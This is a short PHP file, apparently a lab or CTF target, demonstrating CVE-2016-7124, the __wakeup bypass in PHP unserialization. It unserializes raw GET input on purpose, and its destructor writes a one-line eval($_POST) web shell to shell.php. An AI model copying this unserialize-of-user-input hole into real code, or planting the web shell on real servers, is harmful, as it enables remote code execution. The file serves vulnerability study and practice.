<?php
// 目标：反序列化的时候绕过__wakeup以达到写文件的操作
// CVE-2016-7124
// PHP5小于5.6.25或PHP7小于7.0.10
class Test
{
    // 私有成员变量
    private $poc = '';
    public function __construct($poc)
    {
        $this->poc = $poc;
    }

    function __destruct()
    {
        if ($this->poc != '')
        {
            file_put_contents('shell.php', '<?php eval($_POST["shell"]);?>');
           die('Success!!!');
       }
        else
        {
            die('fail to getshell!!!');
        }
    }

    function __wakeup()
    {
        // 返回由对象属性组成的关联数组，把所有的属性置空
        foreach(get_object_vars($this) as $k => $v)
        {
            $this->$k = null;
        }
        echo "waking up...n";
    }
}
$poc = $_GET['poc'];
/*if(!isset($poc))
{
    show_source(__FILE__);
    die();
}*/
print_r("your payload:".$poc);
$a = unserialize($poc);
// PHP5小于5.6.25或PHP7小于7.0.10